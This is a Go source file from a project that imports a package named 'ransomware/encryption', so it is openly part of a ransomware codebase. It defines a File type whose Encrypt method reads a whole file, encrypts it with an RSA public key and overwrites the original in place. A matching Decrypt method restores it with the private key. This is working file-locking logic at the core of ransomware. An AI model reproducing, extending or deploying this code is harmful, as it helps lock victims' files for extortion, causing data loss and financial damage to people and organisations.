package io

import (
	"crypto/rsa"
	"os"
	enc "ransomware/encryption"
)

type File struct {
	Info      os.FileInfo
	Path      string
	Extension string
}

func (file *File) Encrypt(pubKey *rsa.PublicKey) error {

	osFile, err := os.Open(file.Path)
	if err != nil {
		return err
	}

	buffer := make([]byte, file.Info.Size())
	osFile.Read(buffer)
	defer osFile.Close()

	encrypted := enc.Encrypt(buffer, pubKey)

	osFile, _ = os.Create(file.Path)
	_, err = osFile.Write(encrypted)
	if err != nil {
		return err
	}

	osFile.Close()

	return nil
}

func (file *File) Decrypt(privKey *rsa.PrivateKey) error {
	osFile, err := os.Open(file.Path)
	if err != nil {
		return err
	}

	buffer := make([]byte, file.Info.Size())

	osFile.Read(buffer)

	defer osFile.Close()

	decrypted := enc.Decrypt(buffer, privKey)

	osFile, _ = os.Create(file.Path)
	_, err = osFile.Write(decrypted)
	if err != nil {
		return err
	}

	osFile.Close()

	return nil
}
